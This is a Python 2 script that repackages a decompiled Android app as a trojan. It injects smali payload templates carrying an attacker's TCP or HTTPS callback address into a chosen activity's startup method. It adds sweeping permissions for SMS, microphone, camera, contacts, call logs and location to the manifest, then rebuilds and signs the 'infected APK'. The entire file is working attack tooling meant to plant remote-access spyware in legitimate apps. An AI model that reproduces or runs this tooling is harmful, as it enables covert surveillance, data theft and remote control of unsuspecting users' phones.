#!/usr/bin/pyton
import subprocess
import sys
import os
from bs4 import BeautifulSoup as Soup

activityToTarget=sys.argv[5]
targetFolder=""
endpointIP=""
endpointPort=""
hexEndpoint=""
facepalm=""
cwd=""
httpsComms=0

def byteTheTCPComms():
	print "[*] BYTING TCP COMMS"
	totalEndpointPlain="ZZZZtcp://"+endpointIP+":"+endpointPort
	endpointLength=len(totalEndpointPlain)
	global facepalm
	global httpsComms
	httpsComms=0
	facepalm=hex(endpointLength)
	global hexEndpoint
	for val in totalEndpointPlain:
		hexEndpoint+=hex(ord(val))+"\n\t\t"

def byteTheHTTPSComms():
	print "[*] BYTING HTTPS COMMS"
	global httpsComms
	httpsComms=1
	totalEndpointPlain="ZZZZhttps://"+endpointIP+":"+endpointPort+"/qFTHTkSl1FhadlllA0gBcg882wlHLDmhMn6j1_ykMcArMkXkE-KOQ3RV-W7JtI5nf7x65a3fwcwgLEPvnCgmeb2f0m-VVEm_qAMZzFhGdNn8F46OtF_FJAP1b1AjG5x8X-GGH-rekgabzOzEMkQkgqYuUl"
	endpointLength=len(totalEndpointPlain)
	global facepalm
	facepalm=hex(endpointLength)
	global hexEndpoint
	for val in totalEndpointPlain:
		hexEndpoint+=hex(ord(val))+"\n\t\t"

def initialize():
	global endpointPort
	global endpointIP
	endpointIP=sys.argv[3]
	endpointPort=sys.argv[4]
	global cwd

	print "[+] ENDPOINT IP: "+endpointIP
	print "[+] ENDPOINT PORT: "+endpointPort

	cwd = os.getcwd()

	global targetFolder
	targetFolder=sys.argv[1]


def readPayloads():
	print "[*] PREPARING PAYLOADS"
	global cwd

	if httpsComms==1:
		pathToPalyoad1=cwd+"/"+"payload/HttpsActivity1.smali"
		pathToPalyoad2=cwd+"/"+"payload/HttpsActivity.smali"
		pathToPalyoad3=cwd+"/"+"payload/PayloadTrustManager.smali"
		contentsOfFile1 = open(pathToPalyoad1).read()
		contentsOfFile2 = open(pathToPalyoad2).read()
		contentsOfFile3 = open(pathToPalyoad3).read()

		inject="L"+activityToTarget.replace('.','/')
		intPackagePos=inject.rfind('/')

		moo=inject[:intPackagePos]
		packageNewName =moo.replace('/','.').replace('L','')
		finalPackageNewName=packageNewName+".PayloadTrustManager"

		preppedContents1= contentsOfFile1.replace('PLACEHOLDER',inject[:intPackagePos])
		preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos]).replace('OILYOLO',finalPackageNewName)
		preppedContents3= contentsOfFile3.replace('PLACEHOLDER',inject[:intPackagePos])

		#inject the tcp endpoint here
		preppedContents2=preppedContents2.replace('IP_ADDR',endpointIP)
		preppedContents2= preppedContents2.replace('END_PORT',endpointPort)

		targetDirectory=targetFolder+"/smali/"+activityToTarget.replace('.','/')
		targetDirectory=targetDirectory[:targetDirectory.rfind('/')]

		assist1File = open(targetDirectory+"/HttpsActivity1.smali", "w")
		assist1File.write(preppedContents1)
		assist1File.close()

		assist2File = open(targetDirectory+"/HttpsActivity.smali", "w")
		assist2File.write(preppedContents2)
		assist2File.close()

		assist3File = open(targetDirectory+"/PayloadTrustManager.smali", "w")
		assist3File.write(preppedContents3)
		assist3File.close()

		pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
		stringContentsOfTargetActivity=""
		stringContentsOfTargetActivity = open(pathToFile).read()
	else:
		pathToPalyoad1=cwd+"/"+"payload/AssistActivity1.smali"
		pathToPalyoad12=cwd+"/"+"payload/AssistActivity.smali"
		contentsOfFile1 = open(pathToPalyoad1).read()
		contentsOfFile2 = open(pathToPalyoad12).read()
		inject="L"+activityToTarget.replace('.','/')
		intPackagePos=inject.rfind('/')
		preppedContents1= contentsOfFile1.replace('PLACEHOLDER',inject[:intPackagePos])
		preppedContents2= contentsOfFile2.replace('PLACEHOLDER',inject[:intPackagePos])
		#inject the tcp endpoint here
		preppedContents2= preppedContents2.replace('FACEPALM',facepalm)
		preppedContents2= preppedContents2.replace('BEARDEDGREATNESS',hexEndpoint)
		targetDirectory=targetFolder+"/smali/"+activityToTarget.replace('.','/')
		targetDirectory=targetDirectory[:targetDirectory.rfind('/')]

		assist1File = open(targetDirectory+"/AssistActivity1.smali", "w")
		assist1File.write(preppedContents1)
		assist1File.close()

		assist2File = open(targetDirectory+"/AssistActivity.smali", "w")
		assist2File.write(preppedContents2)
		assist2File.close()

		pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
		stringContentsOfTargetActivity=""
		stringContentsOfTargetActivity = open(pathToFile).read()

def injectIntoActivity():
	print "[*] INJECTING INTO APK"
	global targetFolder
	checkStrings=['create','method']
	stringInvokePayload=""

	pathToFile=targetFolder+"/smali/"+activityToTarget.replace('.','/')+'.smali'
	if httpsComms==1:
		stringInvokePayload='\ninvoke-static {p0}, INJECT/HttpsActivity;->start(Landroid/content/Context;)V\n'
	else:
		stringInvokePayload='\ninvoke-static {p0}, INJECT/AssistActivity;->doThis(Landroid/content/Context;)V\n'

	#NOW WE NEED TO INJECT THE CALLING CODE INTO THE TARGET ACTIVITY
	inject="L"+activityToTarget.replace('.','/')
	intPackagePos=inject.rfind('/')
	stringPackageToInject=inject[:intPackagePos]
	stringInvokePayload=stringInvokePayload.replace('INJECT',stringPackageToInject);
	f = open(pathToFile,'r')
	stringDataToWriteIntoNewActivity=""
	for line in f.readlines():
		stringDataToWriteIntoNewActivity+=line
		if all(x in line.lower() for x in checkStrings):
			stringDataToWriteIntoNewActivity+=stringInvokePayload
			f.close()
	newInjectFile = open(pathToFile, "w")
	newInjectFile.write(stringDataToWriteIntoNewActivity)
	newInjectFile.close()

def buildAgain():
	print "[+] TIME TO BUILD INFECTED APK..."
	#name of the APK we are targeting
	stringNameOfAPK=sys.argv[1]+'.apk'
	#the path to our freshly built apk
	pathToNewApk=targetFolder+"/dist/"+stringNameOfAPK
	#the apktool command to rebuild our target app
	stringApkToolBuildCommand= ["apktool","b",targetFolder]
	#jarsigner command to sign our freshly built apk
	stringJarSignerCommand=["jarsigner", "-keystore", cwd+"/"+"payload/mykey.keystore", pathToNewApk, "alias_name", "-sigalg", "MD5withRSA", "-digestalg", "SHA1"]
	#time to execute the build command
	print "[*] EXECUTING APKTOOL BUILD COMMAND..."
	p = subprocess.Popen(stringApkToolBuildCommand, stdout=subprocess.PIPE)
	buildResult = p.communicate()[0]
	print "[+] BUILD RESULT"
	print "#####################################"
	print buildResult
	print "#####################################"
	#time to execute the jarsigner command
	print "[*] EXECUTING JARSIGNER COMMAND..."
	p = subprocess.Popen(stringJarSignerCommand, stdout=subprocess.PIPE)
	jarsignerResult = p.communicate()[0]
	print "[+] JARSIGNER RESULT"
	print "#####################################"
	print jarsignerResult
	print "#####################################"
	print "\n[+] L00t located at "+targetFolder+"/dist/"+sys.argv[1]

def injectCrazyPermissions():
		print "[*] INJECTION OF CRAZY PERMISSIONS TO BE DONE!"
		stringCrazyPermissions='\n<uses-permission android:name="android.permission.INTERNET" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.READ_PHONE_STATE" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.SEND_SMS" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.RECEIVE_SMS"/>'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.CALL_PHONE" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.READ_CONTACTS" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.WRITE_CONTACTS" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.RECORD_AUDIO" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.WRITE_SETTINGS" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.CAMERA" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.READ_SMS" />'
		stringCrazyPermissions+='\n<uses-permission android:name="android.permission.READ_CALL_LOG" />"\n'

		global targetFolder
		checkString="<uses-permission android:name="
		pathToFile=targetFolder+"/AndroidManifest.xml"
		#NOW WE NEED TO INJECT THE ADDITIONAL PERMISSIONS INTO THE TARGET MANIFEST
		firstCheck=0;
		f = open(pathToFile,'r')
		stringDataToWriteIntoNewActivity=""
		for line in f.readlines():
			stringDataToWriteIntoNewActivity+=line
			if checkString.lower() in line.lower():
				if firstCheck==0:
					stringDataToWriteIntoNewActivity+=stringCrazyPermissions
					firstCheck=1
		f.close()
		newInjectFile = open(pathToFile, "w")
		newInjectFile.write(stringDataToWriteIntoNewActivity)
		newInjectFile.close()



if __name__ == "__main__":
	try:
		initialize()
	except Exception as e:
		print "!!!! ERROR IN 'initialize' method"
		print str(e)
		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		sys.exit()
	try:
		if "https" in sys.argv[2]:
			byteTheHTTPSComms()
		else:
			byteTheTCPComms()
	except Exception as e:
		print "!!! ERROR IN 'byteTheComms' method"
		print str(e)
		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		sys.exit()
	try:
		readPayloads()
	except Exception as e:
		print "!!! ERROR IN 'readPayloads' method"
		print str(e)
		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		sys.exit()
	try:
		injectIntoActivity()
	except Exception as e:
		print "!!! ERROR IN 'injectIntoActivity' method"
		print str(e)
		print "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
		sys.exit()
	try:
		injectCrazyPermissions()
	except Exception as e:
		print "!!! ERROR IN 'injectCrazyPermissions' method"
		print str(e)
		sys.exit()
	try:
		buildAgain()
	except Exception as e:
		print "!!! ERROR IN 'buildAgain' method"
		print str(e)
		sys.exit()
